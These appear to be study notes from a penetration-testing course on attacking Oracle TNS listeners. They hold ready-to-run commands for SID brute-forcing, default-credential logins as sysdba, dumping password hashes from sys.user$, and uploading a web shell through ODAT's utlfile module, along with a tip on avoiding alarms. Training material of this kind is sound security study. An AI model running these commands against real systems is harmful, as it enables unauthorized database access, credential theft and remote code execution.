# Oracle TNS - [LINK](https://academy.hackthebox.com/app/module/112/section/2117)

Oracle TNS (Transparent Network Substrate) is the proprietary protocol that facilitates communication between Oracle databases and client applications. It natively listens on **TCP port 1521**.

**Key Architectural Files**
Typically located in `$ORACLE_HOME/network/admin`:

* `tnsnames.ora`: The client-side configuration file that resolves service names to network addresses.
* `listener.ora`: The server-side configuration file dictating how the listener process handles incoming requests.

**The System Identifier (SID)**
The SID is a unique name identifying a specific database instance on the server. You *cannot* connect to an Oracle database without knowing or guessing a valid SID.

**1. Enumeration & SID Brute-Forcing**
Identify the service and guess the SID using Nmap or ODAT (Oracle Database Attacking Tool).

* **Version Scan:** `nmap -p1521 -sV <TARGET_IP>`
* **Brute-Force SID:** `nmap -p1521 --script oracle-sid-brute <TARGET_IP>`
* **Automated ODAT Scan:** `./odat.py all -s <TARGET_IP>` (Runs all modules to brute-force SIDs, find default credentials, and identify vulnerabilities).

**2. Connecting via SQL*Plus**
Once you have valid credentials (e.g., `scott`/`tiger`) and the SID (e.g., `XE`), use the `sqlplus` CLI tool to interact with the database.

* **Standard Login:** `sqlplus scott/tiger@<TARGET_IP>/XE`
* **Privilege Escalation (SysDBA):** If the account has administrative privileges, you can elevate your session instantly during login:
`sqlplus scott/tiger@<TARGET_IP>/XE as sysdba`

**3. Database Interaction & Data Extraction**
Use these core SQL queries once connected to map privileges and extract data:

| Objective | SQL Query |
| --- | --- |
| **List all tables** | `select table_name from all_tables;` |
| **Check current privileges** | `select * from user_role_privs;` |
| **Extract password hashes** *(Requires SysDBA)* | `select name, password from sys.user$;` |

**4. Achieving RCE via File Upload**
If the target is running a web server on the same host, you can abuse Oracle's file management capabilities to write a web shell directly to the webroot (e.g., `C:\inetpub\wwwroot` or `/var/www/html`).

Use ODAT's `utlfile` module to push a local payload to the target:

```bash
./odat.py utlfile -s <TARGET_IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.txt ./shell.txt

```

*Note: Always test upload capabilities with a benign text file before dropping a malicious PHP or ASPX web shell to avoid triggering alarms.*
